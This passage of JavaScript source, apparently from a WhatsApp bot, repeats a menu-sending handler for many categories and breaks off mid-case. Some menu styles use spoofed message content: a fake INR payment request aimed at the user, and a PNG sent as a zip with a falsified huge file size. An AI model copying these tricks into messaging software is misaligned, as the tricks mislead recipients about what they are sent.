                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'othermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${othermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'downloadmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${downloadmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'groupmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${groupmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'funmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${funmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'stalkermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${stalkermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'randomphotomenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${randphotomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'randomvideomenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${randvideomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'photooxymenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${photooxymenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'ephoto360menu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${ephoto360menu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'makermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${makermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    nyanBot2.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    nyanBot2.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    nyanBot2.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    nyanBot2.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	nyanBot2.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/nyancat.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'nsfwmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${nsfwmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    nyanBot2.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/nyancat.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    nyanBot2.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/nyancat.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
